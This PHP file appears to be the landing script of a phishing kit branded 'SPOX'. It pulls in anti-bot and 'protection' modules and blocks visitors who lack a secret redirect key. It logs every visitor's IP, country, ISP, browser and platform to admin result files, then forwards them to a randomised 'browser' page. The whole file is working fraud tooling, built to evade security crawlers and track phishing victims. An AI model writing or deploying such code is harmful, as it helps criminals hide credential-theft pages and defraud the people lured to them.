<?php
ob_start("ob_gzhandler");
session_start();
if(filesize("antibot.ini") == 1) {
} else{
require_once("antibot.php");
}
include 'protection.php';
if ($redirect == "on") {
    $password = $redirect_password;
  if(!isset($_GET[$password])) {
    text_spox("admin/result/blocked.txt","".$ip_spox." |".$country_code_spox."| ".$country_spox." | ".$_SESSION['browser']." | ".$_SESSION['platform']." | ".$ISP_spox." | ".date("h:i:sa")." | Wrong Redirect\n");include'blocked.php';exit();
  }
}
if (!isset($_SESSION['visitor'])) {
    text_spox("admin/result/visitor.txt","".$ip_spox." |".$country_code_spox."| ".$country_spox." | ".$_SESSION['browser']." | ".$_SESSION['platform']." | ".$ISP_spox." | ".date("h:i:sa")." | SPOX VISITOR \n");
    $_SESSION['visitor'] = "visitor";
}

if (!isset($_SESSION['SPOX_SESSION'])) {
    $_SESSION['SPOX_SESSION'] = $SPOX_SESSION;
}
header("location: browser?ch_id=".$rundomizi."&country=".$country_spox."&iso=".$country_code_spox."&expired=".$expired."");

?>